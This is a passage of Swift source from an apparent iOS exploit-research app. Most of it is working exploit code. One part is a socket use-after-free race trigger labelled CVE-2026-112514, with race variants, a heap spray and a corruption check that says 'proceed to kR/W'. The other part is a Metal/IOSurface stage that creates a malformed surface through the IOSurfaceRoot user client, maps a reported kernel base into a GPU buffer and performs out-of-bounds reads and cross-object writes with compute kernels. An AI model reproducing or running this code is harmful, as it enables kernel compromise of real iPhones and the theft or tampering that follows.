        target += "?t=\(Int(Date().timeIntervalSince1970))"
        emit("loading \(target); page streams decoded /brtest back")
        webProbeURL = target
        let deadline = Date().addingTimeInterval(45)
        while !scanDone && Date() < deadline {
            try? await Task.sleep(nanoseconds: 200_000_000)
        }
        emit(scanDone ? "webscan done" : "webscan timeout")
        status = "Complete"; isRunning = false
        webProbeURL = ""
    }

    // ---- the Metal half -----------------------------------------------------
    // ---- CVE-2026-112514 socket UAF race (ported from socket_uaf_trigger.c) ----
    final class SocketUafBox {
        var trigger = false
        var stop = false
    }

    func sockUafMakeSocket(_ ip: String, _ port: Int) -> Int32 {
        let fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        if fd < 0 { return -1 }
        var one: Int32 = 1
        let il = socklen_t(MemoryLayout<Int32>.size)
        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, il)
        setsockopt(fd, IPPROTO_TCP, 0x100, &one, il)
        setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &one, il)
        var three: Int32 = 3
        setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &three, il)
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, il)
        var bufsize: Int32 = 256 * 1024
        setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &bufsize, il)
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &bufsize, il)
        var lg = linger()
        lg.l_onoff = 1
        lg.l_linger = 0
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, socklen_t(MemoryLayout<linger>.size))
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, ip, &addr.sin_addr)
        _ = withUnsafePointer(to: &addr) { p in
            p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                connect(fd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        _ = fcntl(fd, F_SETFL, O_NONBLOCK)
        return fd
    }

    func sockUafSpray(_ n: Int) -> [Int32] {
        var fds: [Int32] = []
        for _ in 0..<n {
            let fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            if fd < 0 { break }
            var v = Int32(bitPattern: 0xdeadbeef)
            setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &v, socklen_t(MemoryLayout<Int32>.size))
            fds.append(fd)
        }
        return fds
    }

    func sockUafCheck(_ fds: [Int32]) -> Bool {
        for fd in fds {
            var optval: Int32 = 0
            var optlen = socklen_t(MemoryLayout<Int32>.size)
            let r = getsockopt(fd, SOL_SOCKET, SO_TYPE, &optval, &optlen)
            if r < 0 {
                if errno != EBADF { return true }
            } else if optval != Int32(SOCK_STREAM) {
                return true
            }
            var sb: Int32 = 0
            var sl = socklen_t(MemoryLayout<Int32>.size)
            if getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sb, &sl) == 0 && sb == 0 {
                return true
            }
        }
        return false
    }

    func runSocketUafMode() async {
        isRunning = true
        status = "Socket UAF..."
        log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== CVE-2026-112514 socket UAF trigger (13 Pro) ===")
        signal(SIGPIPE, SIG_IGN)
        let ip = "127.0.0.1"
        let port = 8080
        let iterations = 9000
        // --- local loopback listener so connects reach ESTABLISHED ---
        let listenFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        var laddr = sockaddr_in()
        laddr.sin_family = sa_family_t(AF_INET)
        laddr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, ip, &laddr.sin_addr)
        var yesVal: Int32 = 1
        setsockopt(listenFd, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
        _ = withUnsafePointer(to: &laddr) { p in
            p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                bind(listenFd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        listen(listenFd, 64)
        let heldLock = NSLock()
        var heldAccepted: [Int32] = []
        Thread.detachNewThread {
            while true {
                let c = accept(listenFd, nil, nil)
                if c >= 0 {
                    // Keep the most recent few connections unread (bounded), close older
                    // ones. Leaving data unread keeps it queued in the socket buffers,
                    // and the bound prevents an fd leak over long runs.
                    heldLock.lock()
                    if heldAccepted.count >= 8 { close(heldAccepted.removeFirst()) }
                    heldAccepted.append(c)
                    heldLock.unlock()
                } else { break }
            }
        }
        var triggered = false
        var sendBuf = [UInt8](repeating: 0x41, count: 64)
        var multiBuf = [UInt8](repeating: 0, count: 32)

        for it in 0..<iterations {
            if triggered { break }
            if it % 3 == 0 {
                // ---- variant A: single-fd close vs send (PoC run_race_iteration) ----
                let target = sockUafMakeSocket(ip, port)
                if target >= 0 {
                    let box = SocketUafBox()
                    let closer = Thread {
                        while !box.stop {
                            if box.trigger { close(target); break }
                            usleep(1)
                        }
                    }
                    let sender = Thread {
                        while !box.stop {
                            if box.trigger {
                                _ = send(target, &sendBuf, sendBuf.count, MSG_DONTWAIT)
                                _ = send(target, &sendBuf, sendBuf.count, MSG_DONTWAIT)
                                shutdown(target, SHUT_RDWR)
                            }
                            usleep(1)
                        }
                    }
                    usleep(500)
                    closer.start()
                    sender.start()
                    usleep(100)
                    box.trigger = true
                    usleep(10)
                    let spray = sockUafSpray(256)
                    usleep(100)
                    if sockUafCheck(spray) {
                        emit("[!] ITER \(it) single-fd: CORRUPTION DETECTED")
                        triggered = true
                    }
                    box.stop = true
                    usleep(200)
                    for fd in spray { close(fd) }
                }
            } else if it % 3 == 1 {
                // ---- variant B: 8-fd close-half / send-half (PoC run_multi_fd_race) ----
                var fds: [Int32] = []
                for _ in 0..<8 {
                    let f = sockUafMakeSocket(ip, port)
                    if f >= 0 { fds.append(f) }
                }
                if fds.count >= 4 {
                    usleep(500)
                    var i = 0
                    while i < fds.count {
                        _ = send(fds[i], &multiBuf, multiBuf.count, MSG_DONTWAIT)
                        shutdown(fds[i], SHUT_RDWR)
                        i += 2
                    }
                    i = 0
                    while i < fds.count {
                        close(fds[i]); fds[i] = -1
                        i += 2
                    }
                    let spray = sockUafSpray(256)
                    usleep(50)
                    i = 1
                    while i < fds.count {
                        if fds[i] >= 0 { _ = send(fds[i], &multiBuf, multiBuf.count, MSG_DONTWAIT) }
                        i += 2
                    }
                    if sockUafCheck(spray) {
                        emit("[!] ITER \(it) multi-fd: CORRUPTION DETECTED")
                        triggered = true
                    }
                    for fd in spray { close(fd) }
                    for fd in fds { if fd >= 0 { close(fd) } }
                } else {
                    for fd in fds { close(fd) }
                }
            } else {
                // ---- variant C: AF_UNIX socketpair close vs send (no listener needed) ----
                var pair: [Int32] = [-1, -1]
                let pr = pair.withUnsafeMutableBufferPointer { buf -> Int32 in
                    socketpair(AF_UNIX, SOCK_STREAM, 0, buf.baseAddress)
                }
                if pr == 0 {
                    let box = SocketUafBox()
                    let closer = Thread {
                        while !box.stop { if box.trigger { close(pair[0]); break }; usleep(1) }
                    }
                    let sender = Thread {
                        while !box.stop {
                            if box.trigger {
                                _ = send(pair[0], &sendBuf, sendBuf.count, MSG_DONTWAIT)
                                _ = send(pair[0], &sendBuf, sendBuf.count, MSG_DONTWAIT)
                            }
                            usleep(1)
                        }
                    }
                    let reader = Thread {
                        while !box.stop {
                            var rb = [UInt8](repeating: 0, count: 64)
                            _ = recv(pair[0], &rb, rb.count, MSG_DONTWAIT)
                            usleep(1)
                        }
                    }
                    usleep(200)
                    closer.start(); sender.start(); reader.start()
                    usleep(100)
                    box.trigger = true
                    usleep(20)
                    let spray = sockUafSpray(256)
                    usleep(200)
                    if sockUafCheck(spray) {
                        emit("[!] ITER \(it) socketpair: CORRUPTION DETECTED")
                        triggered = true
                    }
                    box.stop = true
                    usleep(300)
                    for fd in spray { close(fd) }
                    if pair[1] >= 0 { close(pair[1]) }
                }
            }
            if triggered { break }
            if it % 100 == 0 { emit("[*] iter \(it)/\(iterations)") }
        }

        emit(triggered ? "[+] socket UAF TRIGGERED — proceed to kR/W" : "[-] race not won in \(iterations) iterations")
        status = "Complete"
        isRunning = false
    }

    func runMetalMode() async {
        isRunning = true; status = "Metal..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v123 - Brotli in-daemon oracle ===")
        emit("iOS " + ProcessInfo.processInfo.operatingSystemVersionString)

        // ---- 1. the Metal device + library ---------------------------------
        guard let device = MTLCreateSystemDefaultDevice() else {
            emit("[-] no Metal device"); status = "Complete"; isRunning = false; return
        }
        emit("device=\(device.name)")

        // the metallib: base64 -> Documents -> newLibraryWithURL
        guard let b64 = Optional(metallibBase64) else {
            emit("[-] metallib not embedded"); status = "Complete"; isRunning = false; return
        }
        let libURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("default.metallib")
        do {
            let data = Data(base64Encoded: b64) ?? Data()
            try data.write(to: libURL)
        } catch {
            emit("[-] metallib write failed: \(error)"); status = "Complete"; isRunning = false; return
        }
        emit("metallib written (\(libURL.path))")
        var lib: MTLLibrary? = device.makeDefaultLibrary()
        if lib == nil {
            do {
                lib = try device.makeLibrary(URL: libURL)
            } catch {
                emit("[-] library load failed: \(error)")
            }
        }
        guard let lib = lib else {
            emit("[-] no Metal library")
            status = "Complete"; isRunning = false; return
        }
        emit("library loaded")
        runMetalStage2(device: device, library: lib)
        status = "Complete"; isRunning = false
    }

    func runMetalStage2(device: MTLDevice, library: MTLLibrary) {
        // ---- 2. create the bogus surface via the raw user client ------------
        var iter: io_iterator_t = 0
        let kr = xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching("IOSurfaceRoot"), &iter)
        guard kr == 0 else { emit("[-] no IOSurfaceRoot"); return }
        let svc = xq_IOIteratorNext(iter)
        var conn: io_connect_t = 0
        let ok = xq_IOServiceOpen(svc, mach_task_self(), 0, &conn)
        guard conn != 0 else { emit("[-] open failed"); return }
        defer { _ = xq_IOServiceClose(conn) }

        let alloc = 0x10000
        let xml = f1XML(hdr: 0x40000000, data: 0x4000, sc: 4, alloc: alloc)
        var out = [UInt8](repeating: 0, count: 0xc68)
        var outSize: UInt64 = 0xc68
        var sc0: [UInt64] = [0]
        let r: Int32 = sc0.withUnsafeMutableBufferPointer { sb in
            xml.withUnsafeBufferPointer { pb in
                out.withUnsafeMutableBytes { ob in
                    callMethod(conn, 0, UnsafePointer(sb.baseAddress), 1,
                               pb.baseAddress, xml.count,
                               ob.baseAddress, &outSize)
                }
            }
        }
        func u64(_ o: Int) -> UInt64 {
            guard o + 8 <= out.count else { return 0 }
            var v: UInt64 = 0
            for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
            return v
        }
        guard r == 0 else { emit("[-] surface create kr=\(krN(r))"); return }
        let sid = UInt32(u64(0x18) & 0xffffffff)
        let kbase = u64(0x00)
        emit("F1 surface created id=\(sid) kbase=0x\(String(kbase, radix: 16)) alloc=0x\(String(u64(0x20), radix: 16))")
        // full descriptor dump: the plane area is where the per-slice values live
        var dump = ""
        for o in stride(from: 0x40, to: 0xc8, by: 8) {
            dump += String(format: " %02x:%016x", o, u64(o))
        }
        emit("desc[0x40..0xc8]\(dump)")
        var hits = ""
        for o in stride(from: 0, to: 0xc8 - 8, by: 8) {
            let v = u64(o)
            if v == 0x40000000 || v == 0x4000 || v == 0x10000 {
                hits += " [0x\(String(o, radix: 16))=0x\(String(v, radix: 16))]"
            }
        }
        emit("descriptor occurrences of the per-slice values:\(hits.isEmpty ? " NONE" : hits)")

        // ---- 3. wrap the backing in an MTLBuffer ---------------------------
        // (IOSurfaceLookup gives us the IOSurfaceRef for the texture path)
        typealias LookupFn4 = @convention(c) (UInt32) -> UnsafeMutableRawPointer?
        var lookupFn: LookupFn4? = nil
        if let fw = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
           let lu = dlsym(fw, "IOSurfaceLookup") {
            lookupFn = unsafeBitCast(lu, to: LookupFn4.self)
        }
        guard let kp = UnsafeMutableRawPointer(bitPattern: Int(truncatingIfNeeded: kbase)) else { emit("[-] bad kbase"); return }
        guard let f1buf = device.makeBuffer(bytesNoCopy: kp, length: alloc, options: .storageModeShared) else {
            emit("[-] makeBuffer(bytesNoCopy: kernel base) failed")
            return
        }
        emit("F1 buffer wrap ok gpuAddress=0x\(String(f1buf.gpuAddress, radix: 16)) len=\(f1buf.length)")

        // MEASURE THE SURFACE'S GPU MAPPING SIZE.
        // If the bogus geometry reaches the driver, the IOSurface-backed
        // texture's GPU allocation is huge (the bogus per-slice size), and the
        // GPU-VA gap between a buffer allocated before it and one allocated
        // after it grows to match.  If the gap stays small, the driver only
        // ever saw the real 64 KiB and the F1 route is inert on this build.
        let gapBefore = device.makeBuffer(length: 0x1000, options: .storageModeShared)
        emit("probe buffer before: gpuAddress=0x\(String(gapBefore?.gpuAddress ?? 0, radix: 16))")
        var texInfo = "no texture"
        if let lk = lookupFn, let cs = lk(sid) {
            let csRef = unsafeBitCast(cs, to: IOSurfaceRef.self)
            let desc = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                                 width: 64, height: 64, mipmapped: false)
            desc.usage = [.shaderRead, .shaderWrite, .renderTarget]
            desc.storageMode = .shared
            if let tex = device.makeTexture(descriptor: desc, iosurface: csRef, plane: 0) {
                texInfo = "texture ok w=\(tex.width) h=\(tex.height)"
            } else {
                texInfo = "texture creation FAILED"
                // try again with a plain (non-ARGB) format and a private mode
                let d2 = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                                    width: 64, height: 64, mipmapped: false)
                d2.usage = [.shaderRead, .shaderWrite]
                d2.storageMode = .private
                if let tex2 = device.makeTexture(descriptor: d2, iosurface: csRef, plane: 0) {
                    texInfo = "texture ok (private) w=\(tex2.width) h=\(tex2.height)"
                }
            }
        }
        let gapAfter = device.makeBuffer(length: 0x1000, options: .storageModeShared)
        let ga = Int64(gapBefore?.gpuAddress ?? 0)
        let gb = Int64(gapAfter?.gpuAddress ?? 0)
        emit("\(texInfo); buffer after: gpuAddress=0x\(String(gb, radix: 16))")
        emit("GPU-VA gap across the IOSurface mapping = 0x\(String(gb - ga, radix: 16)) (0x10000 would mean the driver only saw the real allocation)")

        // a control buffer allocated after it (the F1 transcript relies on the
        // allocator handing out increasing addresses)
        guard let ctrl = device.makeBuffer(length: alloc, options: .storageModeShared) else {
            emit("[-] control buffer failed"); return
        }
        emit("CTRL buffer gpuAddress=0x\(String(ctrl.gpuAddress, radix: 16))")

        // ---- 4. the compute kernels ---------------------------------------
        guard let readFn = library.makeFunction(name: "readU32"),
              let writeFn = library.makeFunction(name: "writeU32") else {
            emit("[-] functions not found in the library"); return
        }
        guard let readPipe = try? device.makeComputePipelineState(function: readFn),
              let writePipe = try? device.makeComputePipelineState(function: writeFn) else {
            emit("[-] pipeline creation failed"); return
        }
        guard let queue = device.makeCommandQueue() else { emit("[-] no queue"); return }
        let result = device.makeBuffer(length: 4, options: .storageModeShared)!

        func readAt(_ offset: UInt32, _ buf: MTLBuffer? = nil) -> UInt32 {
            guard let cb = queue.makeCommandBuffer(),
                  let enc = cb.makeComputeCommandEncoder() else { return 0 }
            enc.setComputePipelineState(readPipe)
            enc.setBuffer(buf ?? f1buf, offset: 0, index: 0)
            var off = offset
            enc.setBytes(&off, length: 4, index: 1)
            enc.setBuffer(result, offset: 0, index: 2)
            enc.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1),
                               threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            enc.endEncoding()
            cb.commit()
            cb.waitUntilCompleted()
            let p = result.contents().assumingMemoryBound(to: UInt32.self)
            return p.pointee
        }

        func writeAt(_ offset: UInt32, _ value: UInt32) -> Bool {
            guard let cb = queue.makeCommandBuffer(),
                  let enc = cb.makeComputeCommandEncoder() else { return false }
            enc.setComputePipelineState(writePipe)
            enc.setBuffer(f1buf, offset: 0, index: 0)
            var off = offset
            var val = value
            enc.setBytes(&off, length: 4, index: 1)
            enc.setBytes(&val, length: 4, index: 2)
            enc.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1),
                               threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            enc.endEncoding()
            cb.commit()
            cb.waitUntilCompleted()
            return cb.status == .completed
        }

        // ---- 5. sanity + OOB read ------------------------------------------
        emit("READ idx=0x0 -> 0x\(String(readAt(0), radix: 16))")
        emit("READ idx=0x8000 (out of the 0x\(String(alloc, radix: 16)) buffer) -> 0x\(String(readAt(0x8000), radix: 16))")

        // ---- 6. the cross-object write -------------------------------------
        let delta = Int64(ctrl.gpuAddress) - Int64(f1buf.gpuAddress)
        emit("delta = 0x\(String(delta, radix: 16))")
        if delta > 0 {
            // mark the control buffer so we can see our write land
            let marker: UInt32 = 0x43434343
            let st = writeAt(UInt32(delta), marker)
            emit("WRITE at +0x\(String(delta, radix: 16)) status=\(st ? "completed" : "error")")
            let cp = ctrl.contents().assumingMemoryBound(to: UInt32.self)
            var hit = -1
            for i in 0..<(alloc / 4) where cp[i] == marker { hit = i; break }
            emit("CPU view of the control buffer: hit=\(hit) word0=0x\(String(cp[0], radix: 16))")
            // read it back through the GPU (the CPU view of shared memory can
            // be stale)
            let g0 = readAt(0, ctrl)
            let g1 = readAt(4, ctrl)
            emit("GPU view of the control buffer: word0=0x\(String(g0, radix: 16)) word1=0x\(String(g1, radix: 16))")
            if g0 == marker || g1 == marker {
                emit("*** CROSS-OBJECT HIT: the control buffer holds our marker ***")
            } else {
                emit("no marker in the control buffer (GPU view)")
            }
            // restore
            _ = writeAt(UInt32(delta), 0)
        } else {
            emit("delta <= 0: the control buffer is below the F1 buffer; trying the other direction")
            let marker: UInt32 = 0x43434343
            let st = writeAt(UInt32(Int64(UInt32(0)) - delta), marker)
            emit("WRITE at -0x\(String(-delta, radix: 16)) status=\(st ? "completed" : "error")")
            let cp = ctrl.contents().assumingMemoryBound(to: UInt32.self)
            var hit = -1
            for i in 0..<(alloc / 4) where cp[i] == marker { hit = i; break }
            emit(hit >= 0 ? "*** CROSS-OBJECT HIT (word \(hit)) ***" : "no hit")
            _ = writeAt(UInt32(Int64(UInt32(0)) - delta), 0)
        }
    }
}
